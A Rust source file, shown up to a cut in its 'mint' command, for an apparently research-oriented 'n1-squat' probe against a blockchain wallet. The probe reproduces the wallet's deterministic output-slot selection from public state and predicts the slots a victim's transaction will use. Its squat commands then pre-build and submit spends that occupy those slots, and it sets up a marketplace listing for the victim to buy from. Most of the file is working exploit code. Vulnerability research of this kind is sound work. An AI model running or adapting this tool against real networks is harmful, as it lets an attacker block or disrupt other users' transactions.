// n1-squat probe: attacker-side prediction of the native wallet's deterministic
// output-slot hints, plus the squat vehicle (ordinary paged spend into a chosen
// slot) and the marketplace fixtures the victim buys from.
//
// Stage 1 uses `predict` + `collect` (oracle cross-check against the node's own
// paranoid_getSlotHintsSalted). Stage 2 uses `squat` to occupy predicted slots.
//
// Ground truth (pinned commit 52938433, shared early-finance tree):
//   seed  = blake3(serde_json::to_vec(&request))[..8] ^ tip.state_root[..8]
//           ^ owner[..8]                       (noid_rpc/src/server/native/planner.rs:405-408)
//   slots = collect_empty_slot_hints(chain, reserved, seed, count)
//           (noid_rpc/src/wallet_submit.rs:87-210) — pure splitmix64 walk over
//           public state: segment live counts, per-slot emptiness, alloc_counter.

use anyhow::{bail, Context, Result};
use noid_chain::consensus::allocator::{generate_zone_segment_hints, splitmix64};
use noid_chain::consensus::fee_breakdown;
use noid_chain::consensus::params::owner_authorization_version;
use noid_gkr::wallet_authorization::prove_paged_spend_authorization_for_version;
use noid_gkr::OwnerAuthWitness;
use noid_poseidon2b::primitives::{derive_address, Address, SpendSecret};
use noid_tx::native_assets::nft_market::{
    ListingDefinition, ListingState, NftMarketOpening, NFT_FEE_CREDIT,
};
use noid_tx::native_assets::transition::{NativeInputClaim, NativeOperation, NativeOutputClaim};
use noid_tx::native_assets::wire::NativeIntent;
use noid_tx::native_assets::{CollectionId, GenesisAnchor, NftCollection, NftItem};
use serde::{Deserialize, Serialize};
use std::collections::HashSet;

// ---------------------------------------------------------------------------
// Minimal loopback JSON-RPC client (same shape as chaos-latch's factory).
// ---------------------------------------------------------------------------

fn rpc(url: &str, method: &str, params: serde_json::Value) -> Result<serde_json::Value> {
    let hostport = url.strip_prefix("http://").unwrap_or(url).to_string();
    let body = serde_json::json!({
        "jsonrpc": "2.0",
        "id": 1,
        "method": format!("paranoid_{method}"),
        "params": params,
    })
    .to_string();
    let req = format!(
        "POST / HTTP/1.1\r\nHost: {hostport}\r\nContent-Type: application/json\r\n\
         Content-Length: {}\r\nConnection: close\r\n\r\n{body}",
        body.len()
    );
    use std::io::{Read, Write};
    let mut stream = std::net::TcpStream::connect(&hostport)
        .with_context(|| format!("connect {hostport}"))?;
    stream.set_read_timeout(Some(std::time::Duration::from_secs(180)))?;
    stream.set_write_timeout(Some(std::time::Duration::from_secs(60)))?;
    stream.write_all(req.as_bytes())?;
    let mut response = Vec::new();
    stream.read_to_end(&mut response)?;
    let text = String::from_utf8_lossy(&response).to_string();
    let (headers, payload) = text
        .split_once("\r\n\r\n")
        .map(|(h, rest)| (h.to_string(), rest.as_bytes().to_vec()))
        .context("rpc response without header terminator")?;
    let body_bytes = if headers
        .to_ascii_lowercase()
        .contains("transfer-encoding: chunked")
    {
        decode_chunked(&payload)?
    } else {
        payload
    };
    let mut value: serde_json::Value =
        serde_json::from_slice(&body_bytes).with_context(|| {
            format!("decode rpc response from {method}: {:.300}", text)
        })?;
    if let Some(err) = value
        .get_mut("error")
        .and_then(|e| (!e.is_null()).then(|| e.take()))
    {
        bail!("rpc {method} error: {err}");
    }
    Ok(value
        .get_mut("result")
        .map(|r| r.take())
        .unwrap_or(serde_json::Value::Null))
}

fn decode_chunked(payload: &[u8]) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    let mut pos = 0usize;
    loop {
        let line_end = payload[pos..]
            .windows(2)
            .position(|w| w == b"\r\n")
            .map(|p| pos + p)
            .context("chunked: missing size line")?;
        let size_str = std::str::from_utf8(&payload[pos..line_end])?.trim().to_string();
        let size = usize::from_str_radix(size_str.split(';').next().unwrap_or("0"), 16)
            .context("chunked: bad size")?;
        pos = line_end + 2;
        if size == 0 {
            break;
        }
        anyhow::ensure!(pos + size <= payload.len(), "chunked: truncated chunk");
        out.extend_from_slice(&payload[pos..pos + size]);
        pos += size + 2;
    }
    Ok(out)
}

fn hex32(s: &str) -> Result<[u8; 32]> {
    let s = s.trim();
    if s.len() != 64 {
        bail!("expected 64 hex chars, got {}", s.len());
    }
    let mut out = [0u8; 32];
    for i in 0..32 {
        out[i] = u8::from_str_radix(&s[2 * i..2 * i + 2], 16)
            .with_context(|| format!("bad hex at byte {i}"))?;
    }
    Ok(out)
}

fn hexs(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

// ---------------------------------------------------------------------------
// Mirrored NativeWalletRequest (noid_rpc/src/native_types.rs:117-179).
// Same serde attributes so serde_json::to_vec produces the exact bytes the
// daemon's planner hashes at planner.rs:405.
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "action", rename_all = "snake_case", deny_unknown_fields)]
enum NativeWalletRequest {
    TransferToken {
        asset_id: String,
        units: String,
        recipient: String,
    },
    BurnToken {
        asset_id: String,
        units: String,
    },
    Trade {
        asset_id: String,
        buy: bool,
        gross_input: String,
        minimum_output: Option<String>,
        slippage_bps: Option<u16>,
        valid_until: Option<u64>,
    },
    CreateToken {
        whole_tokens: String,
        metadata_hash: String,
        #[serde(default, skip_serializing_if = "Option::is_none")]
        initial_buy_units: Option<String>,
    },
    CreateCollection {
        maximum_items: String,
        metadata_hash: String,
    },
    MintNft {
        collection_id: String,
        metadata_hash: String,
    },
    MintNfts {
        collection_id: String,
        metadata_hashes: Vec<String>,
    },
    TransferNft {
        collection_id: String,
        serial: String,
        recipient: String,
    },
    BurnNft {
        collection_id: String,
        serial: String,
    },
    ListNft {
        collection_id: String,
        serial: String,
        ask_micronoid: String,
        expiry_height: u64,
    },
    BuyNft {
        collection_id: String,
        serial: String,
        maximum_ask_micronoid: String,
    },
    CancelListing {
        collection_id: String,
        serial: String,
    },
}

/// The deterministic planner seed (planner.rs:405-408).
fn planner_seed(request: &NativeWalletRequest, state_root: [u8; 32], owner: &Address) -> u64 {
    let encoded = serde_json::to_vec(request).expect("request serializes");
    u64::from_le_bytes(blake3::hash(&encoded).as_bytes()[..8].try_into().unwrap())
        ^ u64::from_le_bytes(state_root[..8].try_into().unwrap())
        ^ u64::from_le_bytes(owner.0[..8].try_into().unwrap())
}

// ---------------------------------------------------------------------------
// Live state view over public RPC (everything an attacker's synced node can
// read): tip header, segment live counts (getStateMap), per-slot emptiness
// (getSlot). No wallet, no credentials.
// ---------------------------------------------------------------------------

#[derive(Clone)]
struct StateView {
    tip_height: u64,
    state_root: [u8; 32],
    parent_hash: [u8; 32],
    alloc_counter: u64,
    active_slot_count: u64,
    log_slots: u32,
    live_counts: Vec<u32>,
    url: String,
}

fn fetch_view(url: &str) -> Result<StateView> {
    let info = rpc(url, "getChainInfo", serde_json::json!([]))?;
    let height = info["height"].as_u64().context("height")?;
    let header = rpc(url, "getBlockHeader", serde_json::json!([height]))?;
    let map = rpc(url, "getStateMap", serde_json::json!([]))?;
    let mut live_counts = Vec::new();
    for bucket in map["live_counts"].as_array().context("live_counts array")? {
        live_counts.push(bucket.as_u64().context("live count")? as u32);
    }
    Ok(StateView {
        tip_height: height,
        state_root: hex32(header["state_root"].as_str().context("state_root")?)?,
        parent_hash: hex32(header["hash"].as_str().context("hash")?)?,
        alloc_counter: header["alloc_counter"].as_u64().context("alloc_counter")?,
        active_slot_count: header["active_slot_count"]
            .as_u64()
            .context("active_slot_count")?,
        log_slots: header["log_slots"].as_u64().context("log_slots")? as u32,
        live_counts,
        url: url.to_string(),
    })
}

impl StateView {
    /// Faithful port of collect_empty_slot_hints (wallet_submit.rs:87-210)
    /// for resident segments: the streaming variant only differs when segments
    /// are evicted to durable storage, which a small devnet never does.
    fn predict_slots(&self, reserved: &HashSet<u32>, seed: u64, count: usize) -> Vec<u32> {
        if count == 0 {
            return Vec::new();
        }
        let segment_log = (self.log_slots as usize).min(16);
        let segment_size = 1usize << segment_log;
        let segment_full = segment_size as u32;
        let local_mask = (segment_size - 1) as u32;
        let num_slots = 1u64 << self.log_slots;
        let num_segments = if self.log_slots as usize > 16 {
            1usize << (self.log_slots as usize - 16)
        } else {
            1
        };
        let live = |segment: u16| -> u32 {
            self.live_counts
                .get(usize::from(segment))
                .copied()
                .unwrap_or(0)
        };
        let slot_empty = |index: u32| -> bool {
            // Public per-slot read; a synced attacker node has this in state.
            match rpc(
                &self.url,
                "getSlot",
                serde_json::json!([u64::from(index)]),
            ) {
                Ok(slot) => slot["empty"].as_bool().unwrap_or(false),
                Err(_) => false,
            }
        };

        let mut rng = seed;
        let mut hints: Vec<u32> = Vec::with_capacity(count);
        let mut seen: HashSet<u32> = reserved.clone();
        seen.extend(hints.iter().copied());

        let mut take = |hints: &mut Vec<u32>,
                       seen: &mut HashSet<u32>,
                       index: u32|
         -> bool {
            if u64::from(index) >= num_slots || !seen.insert(index) {
                return false;
            }
            if slot_empty(index) {
                hints.push(index);
                if hints.len() == count {
                    return true;
                }
            }
            false
        };

        let mut partial_segments: Vec<u16> = (0..num_segments)
            .map(|segment| segment as u16)
            .filter(|segment| {
                let l = live(*segment);
                l > 0 && l < segment_full
            })
            .collect();
        if !partial_segments.is_empty() {
            let rotation = (splitmix64(&mut rng) as usize) % partial_segments.len();
            partial_segments.rotate_left(rotation);
            // Stable sort by live count, densest first (sort_by is stable).
            partial_segments.sort_by(|left, right| live(*right).cmp(&live(*left)));
        }

        let minimum_headroom =
            (segment_full / 16).max(count.min(segment_size) as u32);
        let mut scarce_segments = Vec::new();
        partial_segments.retain(|segment| {
            if segment_full - live(*segment) < minimum_headroom {
                scarce_segments.push(*segment);
                false
            } else {
                true
            }
        });

        let mut scan_segment = |hints: &mut Vec<u32>,
                                seen: &mut HashSet<u32>,
                                segment_id: u16,
                                rng: &mut u64|
         -> bool {
            let local_start = (splitmix64(rng) as u32) & local_mask;
            let base = u32::from(segment_id) << segment_log;
            for step in 0..segment_size {
                let index = base | (local_start.wrapping_add(step as u32) & local_mask);
                if take(hints, seen, index) {
                    return true;
                }
            }
            false
        };

        for &segment_id in &partial_segments {
            if scan_segment(&mut hints, &mut seen, segment_id, &mut rng) {
                return hints;
            }
        }

        // Virtual-zero zones (allocator.rs:140-160).
        for segment_id in generate_zone_segment_hints(
            self.alloc_counter,
            self.log_slots,
            num_segments,
        ) {
            if live(segment_id) != 0 {
                continue;
            }
            let local_start = (splitmix64(&mut rng) as u32) & local_mask;
            let base = u32::from(segment_id) << segment_log;
            let missing = count.saturating_sub(hints.len());
            let probes = segment_size.min(reserved.len().saturating_add(missing));
            for step in 0..probes {
                let index = base | (local_start.wrapping_add(step as u32) & local_mask);
                if take(&mut hints, &mut seen, index) {
                    return hints;
                }
            }
        }

        for segment_id in scarce_segments {
            if scan_segment(&mut hints, &mut seen, segment_id, &mut rng) {
                break;
            }
        }
        hints
    }
}

// ---------------------------------------------------------------------------
// Wallets: fixed offline secrets, funded on-chain by the devnet operator node.
// ---------------------------------------------------------------------------

fn wallet_secret(name: &str) -> Result<SpendSecret> {
    let mut seed = [0u8; 32];
    seed[0] = match name {
        "seller" => 0x81,
        "squatter" => 0x82,
        _ => bail!("unknown wallet {name:?}"),
    };
    seed[1..6].copy_from_slice(b"n1sqat");
    Ok(SpendSecret::from_bytes(seed))
}

// ---------------------------------------------------------------------------
// Squat vehicle: an ordinary 1-in/1-out paged spend whose single output lands
// in a chosen slot (chaos-latch factory's ordinary_intent shape).
// ---------------------------------------------------------------------------

#[derive(Clone, Debug)]
struct Utxo {
    slot_index: u32,
    amount: u64,
    creation_id: u64,
}

fn fetch_utxos(url: &str, address: &Address) -> Result<Vec<Utxo>> {
    let slots = rpc(
        url,
        "getSlotsByOwner",
        serde_json::json!([address.to_bech32()]),
    )?;
    let mut out = Vec::new();
    for slot in slots.as_array().context("slots array")? {
        out.push(Utxo {
            slot_index: slot["slot_index"].as_u64().context("slot_index")? as u32,
            amount: slot["value"].as_u64().context("value")?,
            creation_id: slot["creation_id"].as_u64().context("creation_id")?,
        });
    }
    out.sort_by_key(|u| u.slot_index);
    Ok(out)
}

fn mempool_floor(url: &str) -> Result<u64> {
    Ok(rpc(url, "getMempoolInfo", serde_json::json!([]))?
        ["fee_floor"]
        .as_u64()
        .context("fee_floor")?)
}

fn epoch_anchor(url: &str) -> Result<[u8; 32]> {
    hex32(
        rpc(url, "getEpochAnchor", serde_json::json!([]))?
            .as_str()
            .context("epoch anchor")?,
    )
}

fn submit_intent(url: &str, bytes: &[u8]) -> Result<String> {
    Ok(rpc(
        url,
        "submitTxIntent",
        serde_json::json!([hexs(bytes)]),
    )?
    .as_str()
    .map(|s| s.to_string())
    .context("submitTxIntent result")?)
}

fn build_squat(
    secret: SpendSecret,
    input: TxInputLike,
    output_slot: u32,
    anchor: [u8; 32],
    height: u64,
    fee: u64,
    _active_slot_count: u64,
    _log_slots: u32,
) -> Result<Vec<u8>> {
    use noid_tx::{
        output_bitmap_bit, PagedSpendIntent, TxBody, TxInput, TxOutput, TxPage,
        PAGED_SPEND_END_BIT, PAGED_SPEND_START_BIT, TX_INPUTS, TX_OUTPUTS,
    };
    let owner = derive_address(&secret);
    let mut inputs = [TxInput::dummy(); TX_INPUTS];
    inputs[0] = TxInput {
        slot_index: input.slot_index,
        amount: input.amount,
        creation_id: input.creation_id,
    };
    let mut outputs = [TxOutput::dummy(); TX_OUTPUTS];
    outputs[0] = TxOutput {
        slot_index: output_slot,
        amount: input.amount - fee,
        owner,
    };
    let body = TxBody {
        epoch_anchor: anchor,
        fee,
        input_owner: owner,
        inputs,
        outputs,
        validity_bitmap: 1 | output_bitmap_bit(0) | PAGED_SPEND_START_BIT | PAGED_SPEND_END_BIT,
        is_coinbase: false,
    };
    let pages = vec![TxPage::new(body)?];
    let proof = prove_paged_spend_authorization_for_version(
        &pages,
        OwnerAuthWitness::new(secret),
        owner_authorization_version(height),
    )?;
    let intent = PagedSpendIntent::new(pages, proof.to_bytes()?)?;
    Ok(intent.to_bytes()?)
}

#[derive(Clone, Copy)]
struct TxInputLike {
    slot_index: u32,
    amount: u64,
    creation_id: u64,
}

// ---------------------------------------------------------------------------
// Marketplace fixtures (ported from chaos-latch's factory: create_collection,
// mint_items, create_listing) so the "seller" role owns the listing the
// victim's BuyNft targets.
// ---------------------------------------------------------------------------

#[derive(Default)]
struct State {
    json: serde_json::Value,
    path: std::path::PathBuf,
}

impl State {
    fn load() -> Result<Self> {
        let path = std::path::PathBuf::from("run/probe-state.json");
        let json = if path.exists() {
            serde_json::from_str(&std::fs::read_to_string(&path)?)?
        } else {
            serde_json::json!({
                "collections": {},
                "items": [],
                "listings": [],
                "squat_inputs_used": [],
            })
        };
        Ok(State { json, path })
    }
    fn save(&self) -> Result<()> {
        if let Some(parent) = self.path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        std::fs::write(&self.path, serde_json::to_string_pretty(&self.json)?)?;
        Ok(())
    }
}

fn address_hex(addr: &Address) -> String {
    hexs(&addr.0)
}

fn address_from_hex(s: &str) -> Result<Address> {
    Ok(Address(hex32(s)?))
}

fn get_slot(url: &str, index: u32) -> Result<(u64, u64)> {
    let slot = rpc(url, "getSlot", serde_json::json!([u64::from(index)]))?;
    Ok((
        slot["value"].as_u64().context("slot value")?,
        slot["creation_id"].as_u64().context("slot creation_id")?,
    ))
}

fn find_empty_slots(url: &str, count: usize, start: u32) -> Result<Vec<u32>> {
    let mut found = Vec::with_capacity(count);
    let mut index = start;
    while found.len() < count {
        let slot = rpc(url, "getSlot", serde_json::json!([u64::from(index)]))?;
        if slot["empty"].as_bool().unwrap_or(false) {
            found.push(index);
        }
        index = index
            .checked_add(1)
            .context("slot index overflow while scanning empty slots")?;
    }
    Ok(found)
}

struct CollectionRecord {
    slot: u32,
    creation_id: u64,
    collection: NftCollection,
}

fn reconstruct_collection(record: &serde_json::Value) -> Result<CollectionRecord> {
    let funding = &record["funding"];
    let genesis = GenesisAnchor {
        chain: noid_chain::state::native_assets::native_chain_id(),
        owner: address_from_hex(record["owner"].as_str().context("owner")?)?,
        input: noid_tx::TxInput {
            slot_index: funding["slot"].as_u64().context("funding slot")? as u32,
            amount: funding["amount"].as_u64().context("funding amount")?,
            creation_id: funding["creation_id"].as_u64().context("funding creation_id")?,
        },
    };
    let metadata = hex32(record["metadata"].as_str().context("metadata")?)?;
    let maximum = record["maximum_items"].as_u64().context("maximum_items")?;
    let mut collection = NftCollection::from_genesis(&genesis, maximum, metadata)?;
    collection.issued_items = record["issued"].as_u64().context("issued")?;
    Ok(CollectionRecord {
        slot: record["slot"].as_u64().context("slot")? as u32,
        creation_id: record["creation_id"]
            .as_u64()
            .context("collection creation_id (run `confirm` after mining)")?,
        collection,
    })
}

fn create_collection(
    url: &str,
    secret: SpendSecret,
    funding: noid_tx::TxInput,
    view: &StateView,
    anchor: [u8; 32],
    metadata: [u8; 32],
    output_slot: u32,
) -> Result<NativeIntent> {
    use noid_tx::native_assets::NativeOpening;
    let owner = derive_address(&secret);
    let height = view.tip_height + 1;
    let genesis = GenesisAnchor {
        chain: noid_chain::state::native_assets::native_chain_id(),
        owner,
        input: funding,
    };
    let collection = NftCollection::from_genesis(&genesis, 8, metadata).context("collection")?;
    let fee = fee_breakdown(1, 2, view.active_slot_count, view.log_slots).required_total;
    let collection_opening = NativeOpening::NftCollection(collection);
    let outputs = vec![
        NativeOutputClaim {
            output: noid_tx::TxOutput {
                slot_index: output_slot,
                amount: 0,
                owner: collection_opening.root(),
            },
            opening: Some(collection_opening),
        },
        NativeOutputClaim {
            output: noid_tx::TxOutput {
                slot_index: 0,
                amount: funding.amount - fee,
                owner,
            },
            opening: None,
        },
    ];
    let context = noid_tx::native_assets::transition::NativeContext {
        chain: noid_chain::state::native_assets::native_chain_id(),
        height,
        authority: owner,
        fee,
    };
    let mut intent = NativeIntent::from_claims(
        &context,
        anchor,
        NativeOperation::CreateCollection { funding_input: 0 },
        vec![NativeInputClaim {
            input: funding,
            root: owner,
            opening: None,
        }],
        outputs,
    )
    .context("collection claims")?;
    assign_output_slots(url, &mut intent)?;
    let proof = noid_gkr::wallet_authorization::prove_native_financial_authorization(
        &intent,
        context.chain,
        nft_round(view)?,
        OwnerAuthWitness::new(secret),
        owner_authorization_version(height),
    )?;
    intent.authorization_bytes = proof.to_bytes()?;
    Ok(intent)
}

fn nft_round(view: &StateView) -> Result<noid_tx::native_assets::nft_market::NftRoundContext> {
    noid_tx::native_assets::nft_market::NftRoundContext::new(
        view.tip_height + 1,
        view.parent_hash,
        view.alloc_counter,
    )
    .map_err(anyhow::Error::from)
}

fn assign_output_slots(url: &str, intent: &mut NativeIntent) -> Result<Vec<u32>> {
    let needed = intent
        .pages
        .iter()
        .flat_map(|page| page.body.outputs.iter().map(|o| o.slot_index))
        .filter(|slot| *slot == 0)
        .count();
    if needed == 0 {
        return Ok(Vec::new());
    }
    let slots = take_slots(url, needed, 3000)?;
    let mut next = slots.iter();
    let mut assigned = Vec::new();
    for page in intent.pages.iter_mut() {
        for output in page.body.outputs.iter_mut() {
            if output.slot_index == 0 {
                let slot = *next.next().context("ran out of fresh slots")?;
                output.slot_index = slot;
                assigned.push(slot);
            }
        }
    }
    Ok(assigned)
}

fn take_slots(url: &str, count: usize, default_start: u32) -> Result<Vec<u32>> {
    let mut state = State::load()?;
    let cursor = state
        .json
        .get("slot_cursor")
        .and_then(|c| c.as_u64())
        .map(|c| c as u32)
        .unwrap_or(default_start);
    let slots = find_empty_slots(url, count, cursor)?;
    let next = slots.last().copied().unwrap_or(cursor).saturating_add(1);
    state.json["slot_cursor"] = serde_json::json!(u64::from(next));
    state.save()?;
    Ok(slots)
}

// ---------------------------------------------------------------------------
// Commands
// ---------------------------------------------------------------------------

fn main() {
    let args: Vec<String> = std::env::args().collect();
    if let Err(error) = run(args) {
        eprintln!("probe error: {error:#}");
        std::process::exit(1);
    }
}

fn run(args: Vec<String>) -> Result<()> {
    let cmd = args.get(1).context("usage: n1-probe <rpc-url> <command> [args...]")?;
    let url = cmd.clone();
    let cmd = args.get(2).context("missing command")?.as_str();
    let rest: Vec<String> = args[3..].to_vec();
    match cmd {
        "address" => {
            let name = rest.first().map(|s| s.as_str()).unwrap_or("");
            println!("{}", derive_address(&wallet_secret(name)?).to_bech32());
        }
        "request-json" => {
            // Print the canonical serialization the daemon's planner will hash.
            let request = parse_request(&rest)?;
            println!("{}", serde_json::to_string(&request)?);
        }
        "seed" => {
            // seed <request-json> <state-root-hex> <owner-bech32>
            let request: NativeWalletRequest =
                serde_json::from_str(rest.first().context("request json")?)?;
            let state_root = hex32(rest.get(1).context("state root")?)?;
            let owner = Address::parse(rest.get(2).context("owner")?.as_str())?;
            println!("{}", planner_seed(&request, state_root, &owner));
        }
        "predict" => {
            // predict <request-json> <owner-bech32> [count] [reserved-slot,...]
            let request: NativeWalletRequest =
                serde_json::from_str(rest.first().context("request json")?)?;
            let owner = Address::parse(rest.get(1).context("owner")?.as_str())?;
            let count: usize = rest
                .get(2)
                .map(|s| s.parse())
                .transpose()?
                .unwrap_or(3);
            let mut reserved = HashSet::new();
            if let Some(list) = rest.get(3) {
                for slot in list.split(',').filter(|s| !s.is_empty()) {
                    reserved.insert(slot.parse::<u32>()?);
                }
            }
            let view = fetch_view(&url)?;
            let seed = planner_seed(&request, view.state_root, &owner);
            let slots = view.predict_slots(&reserved, seed, count);
            println!(
                "tip={} state_root={} seed={} slots={}",
                view.tip_height,
                hexs(&view.state_root),
                seed,
                serde_json::to_string(&slots)?
            );
        }
        "collect" => {
            // collect <salt-hex> [count] — my port vs the node's own
            // paranoid_getSlotHintsSalted, cross-validating the walk.
            // Replicates seed_from_salt_hex (server.rs:396-406) then
            // mix_slot_hint_seed (server.rs:298-302).
            let salt_hex = rest.first().map(|s| s.trim_start_matches("0x").to_string());
            let salt_hex = salt_hex.filter(|s| !s.is_empty()).unwrap_or_else(|| "00".into());
            let salt_bytes = hex::decode(&salt_hex).context("salt hex")?;
            let mut acc: u64 = 0xD6E8_FD9D_AA28_4A7B;
            for chunk in salt_bytes.chunks(8) {
                let mut word = [0u8; 8];
                word[..chunk.len()].copy_from_slice(chunk);
                acc ^= u64::from_le_bytes(word);
                acc = splitmix64(&mut acc);
            }
            let count: usize = rest
                .get(1)
                .map(|s| s.parse())
                .transpose()?
                .unwrap_or(3);
            let view = fetch_view(&url)?;
            let tip_seed = u64::from_le_bytes(view.state_root[..8].try_into().unwrap());
            let mut s = tip_seed ^ acc ^ 0x9E37_79B9_7F4A_7C15;
            let seed = splitmix64(&mut s);
            let mine = view.predict_slots(&HashSet::new(), seed, count);
            let node = rpc(
                &url,
                "getSlotHintsSalted",
                serde_json::json!([count as u32, salt_hex]),
            )?;
            let node_slots: Vec<u32> = serde_json::from_value(node)?;
            println!(
                "seed={} mine={} node={} match={}",
                seed,
                serde_json::to_string(&mine)?,
                serde_json::to_string(&node_slots)?,
                mine == node_slots
            );
        }
        "squat" => {
            // squat <wallet> <slot> [fee] — build + submit into the chosen slot.
            let name = rest.first().context("wallet name")?;
            let slot: u32 = rest.get(1).context("slot")?.parse()?;
            let secret = wallet_secret(name)?;
            let address = derive_address(&secret);
            let view = fetch_view(&url)?;
            let height = view.tip_height + 1;
            let floor = mempool_floor(&url)?;
            let required = fee_breakdown(1, 1, view.active_slot_count, view.log_slots)
                .required_total;
            let fee: u64 = rest
                .get(2)
                .map(|s| s.parse())
                .transpose()?
                .unwrap_or_else(|| floor.max(required));
            let utxos = fetch_utxos(&url, &address)?;
            let used: HashSet<u32> = State::load()?
                .json
                .get("squat_inputs_used")
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|s| s.as_u64().map(|u| u as u32))
                        .collect()
                })
                .unwrap_or_default();
            let utxo = utxos
                .iter()
                .find(|u| !used.contains(&u.slot_index) && u.amount > fee + 1000)
                .context("no unused squatter UTXO with enough value")?;
            let anchor = epoch_anchor(&url)?;
            let t0 = std::time::Instant::now();
            let bytes = build_squat(
                secret,
                TxInputLike {
                    slot_index: utxo.slot_index,
                    amount: utxo.amount,
                    creation_id: utxo.creation_id,
                },
                slot,
                anchor,
                height,
                fee,
                view.active_slot_count,
                view.log_slots,
            )?;
            let build_secs = t0.elapsed().as_secs_f64();
            match submit_intent(&url, &bytes) {
                Ok(txid) => {
                    let mut state = State::load()?;
                    state
                        .json
                        .get_mut("squat_inputs_used")
                        .and_then(|v| v.as_array_mut())
                        .map(|a| a.push(serde_json::json!(u64::from(utxo.slot_index))));
                    state.save()?;
                    println!(
                        "squat ADMITTED txid={txid} slot={slot} fee={fee} input_slot={} \
                         build_secs={build_secs:.1}",
                        utxo.slot_index
                    );
                }
                Err(error) => {
                    println!("squat REJECTED slot={slot} fee={fee} error={error}");
                }
            }
        }
        "squat-prep" => {
            // squat-prep <wallet> <slot> [fee] — build but do not submit;
            // prints the intent hex for an instant fire later.
            let name = rest.first().context("wallet name")?;
            let slot: u32 = rest.get(1).context("slot")?.parse()?;
            let secret = wallet_secret(name)?;
            let address = derive_address(&secret);
            let view = fetch_view(&url)?;
            let height = view.tip_height + 1;
            let floor = mempool_floor(&url)?;
            let required = fee_breakdown(1, 1, view.active_slot_count, view.log_slots)
                .required_total;
            let fee: u64 = rest
                .get(2)
                .map(|s| s.parse())
                .transpose()?
                .unwrap_or_else(|| floor.max(required));
            let utxos = fetch_utxos(&url, &address)?;
            let used: HashSet<u32> = State::load()?
                .json
                .get("squat_inputs_used")
                .and_then(|v| v.as_array())
                .map(|a| {
                    a.iter()
                        .filter_map(|s| s.as_u64().map(|u| u as u32))
                        .collect()
                })
                .unwrap_or_default();
            let utxo = utxos
                .iter()
                .find(|u| !used.contains(&u.slot_index) && u.amount > fee + 1000)
                .context("no unused squatter UTXO with enough value")?;
            let anchor = epoch_anchor(&url)?;
            let t0 = std::time::Instant::now();
            let bytes = build_squat(
                secret,
                TxInputLike {
                    slot_index: utxo.slot_index,
                    amount: utxo.amount,
                    creation_id: utxo.creation_id,
                },
                slot,
                anchor,
                height,
                fee,
                view.active_slot_count,
                view.log_slots,
            )?;
            println!(
                "PREP input_slot={} fee={} slot={} build_secs={:.1} hex={}",
                utxo.slot_index,
                fee,
                slot,
                t0.elapsed().as_secs_f64(),
                hexs(&bytes)
            );
        }
        "squat-fire" => {
            // squat-fire <intent-hex> [input-slot] — submit a prebuilt squat.
            let bytes = hex::decode(rest.first().context("intent hex")?)?;
            match submit_intent(&url, &bytes) {
                Ok(txid) => {
                    if let Some(input_slot) = rest.get(1) {
                        let mut state = State::load()?;
                        state
                            .json
                            .get_mut("squat_inputs_used")
                            .and_then(|v| v.as_array_mut())
                            .map(|a| a.push(serde_json::json!(input_slot)));
                        state.save()?;
                    }
                    println!("squat ADMITTED txid={txid}");
                }
                Err(error) => println!("squat REJECTED error={error}"),
            }
        }
        "floor" => {
            let view = fetch_view(&url)?;
            let required = fee_breakdown(1, 1, view.active_slot_count, view.log_slots)
                .required_total;
            println!(
                "floor={} required_1in1out={} effective={}",
                mempool_floor(&url)?,
                required,
                mempool_floor(&url)?.max(required)
            );
        }
        "utxos" => {
            let name = rest.first().context("wallet name")?;
            let secret = wallet_secret(name)?;
            let address = derive_address(&secret);
            for utxo in fetch_utxos(&url, &address)? {
                println!("{} {} {}", utxo.slot_index, utxo.amount, utxo.creation_id);
            }
        }
        "collection" => {
            let metadata = rest
                .first()
                .map(|h| hex32(h))
                .transpose()?
                .unwrap_or([0xd1; 32]);
            let secret = wallet_secret("seller")?;
            let address = derive_address(&secret);
            let view = fetch_view(&url)?;
            let utxos = fetch_utxos(&url, &address)?;
            let funding = utxos.first().context("seller wallet needs a utxo")?;
            let slot = take_slots(&url, 1, 10_000)?[0];
            let intent = create_collection(
                &url,
                secret,
                noid_tx::TxInput {
                    slot_index: funding.slot_index,
                    amount: funding.amount,
                    creation_id: funding.creation_id,
                },
                &view,
                epoch_anchor(&url)?,
                metadata,
                slot,
            )?;
            let fee = intent.pages[0].body.fee;
            match submit_intent(&url, &intent.to_bytes()?) {
                Ok(txid) => {
                    let mut state = State::load()?;
                    state.json["collections"]["seller"] = serde_json::json!({
                        "owner": address_hex(&address),
                        "funding": {"slot": funding.slot_index, "amount": funding.amount,
                                    "creation_id": funding.creation_id},
                        "maximum_items": 8,
                        "metadata": hexs(&metadata),
                        "slot": slot,
                        "creation_id": null,
                        "issued": 0,
                    });
                    state.save()?;
                    println!("collection ADMITTED txid={txid} fee={fee} slot={slot}");
                }
                Err(error) => println!("collection REJECTED fee={fee} error={error}"),
            }
        }
        "confirm" => {
            let mut state = State::load()?;
            for (_name, record) in state.json["collections"]
                .as_object_mut()
                .context("collections")?
            {
                if record["creation_id"].is_null() {
                    let (value, creation_id) =
                        get_slot(&url, record["slot"].as_u64().context("slot")? as u32)?;
                    if value == 0 {
                        record["creation_id"] = serde_json::json!(creation_id);
                        println!(
                            "collection slot {} confirmed creation_id={creation_id}",
                            record["slot"]
                        );
                    }
                }
            }
            for item in state.json["items"]
                .as_array_mut()
                .context("items")?
                .iter_mut()
            {
                if item["creation_id"].is_null() {
                    let (value, creation_id) =
                        get_slot(&url, item["slot"].as_u64().context("slot")? as u32)?;
                    if value == 0 && creation_id != 0 {
                        item["creation_id"] = serde_json::json!(creation_id);
                        println!("item slot {} creation_id={}", item["slot"], creation_id);
                    }
                }
            }
            for listing in state.json["listings"]
                .as_array_mut()
                .context("listings")?
                .iter_mut()
            {
                if listing["creation_id"].is_null() {
                    let (value, creation_id) =
                        get_slot(&url, listing["slot"].as_u64().context("slot")? as u32)?;
                    if value == NFT_FEE_CREDIT {
                        listing["creation_id"] = serde_json::json!(creation_id);
                        println!(
                            "listing slot {} confirmed creation_id={creation_id}",
                            listing["slot"]
                        );
                    }
                }
            }
            state.save()?;
        }
        "mint" => {
            // mint <count> [metadata-hex-2]
            let count: usize = rest.first().context("count")?.parse()?;
            let metadata = rest
                .get(1)
                .map(|h| hex32(h))
                .transpose()?
